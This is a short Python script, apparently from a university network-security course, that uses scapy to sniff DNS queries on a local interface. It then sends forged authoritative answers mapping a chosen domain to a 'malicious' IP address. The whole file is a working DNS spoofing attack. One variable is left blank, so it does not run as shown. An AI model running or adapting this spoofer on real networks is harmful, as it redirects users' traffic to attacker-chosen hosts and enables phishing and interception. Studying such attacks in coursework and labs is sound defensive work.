#Orignial Source: https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:netsec:2016:report-netsecgroup14.pdf

from scapy.all import *
DNS_IP = "1.1.1.1"
Malicious_IP = "127.0.0.1"
SRC_IP = 

def DNS_Responder(DNS_IP, MAL_IP, SRC_IP):
    def getResponse(pkt):
        # check ancount
        if (DNS in pkt and pkt[DNS].opcode==0 and pkt[DNS].ancount==0 and pkt[IP].src==SRC_IP and pkt[IP].dst==DNS_IP):
            print(pkt['DNS Question Record'].qname)
            if b"cdm.depaul.edu" in pkt['DNS Question Record'].qname:
                spfResp=IP(dst=pkt[IP].src, src=pkt[IP].dst)\
                /UDP(dport=pkt[UDP].sport,sport=pkt[UDP].dport)\
                /DNS(id=pkt[DNS].id,qr=1,aa=1,qd=pkt[DNS].qd,qdcount=1,rd=1,ancount=1,nscount=0,arcount=0,
                an=(DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=3600,rdata=MAL_IP)))
                send(spfResp,verbose=1,iface="Intel(R) Gigabit CT Desktop Adapter")
                return "Spoofed DNS Response Sent " + str(pkt['DNS Question Record'].qname)
            else:
                return "Don't care " + str(pkt['DNS Question Record'].qname)
        else:
            pass
    return getResponse
sniff(prn=DNS_Responder(DNS_IP, Malicious_IP, SRC_IP),iface="Intel(R) Gigabit CT Desktop Adapter")

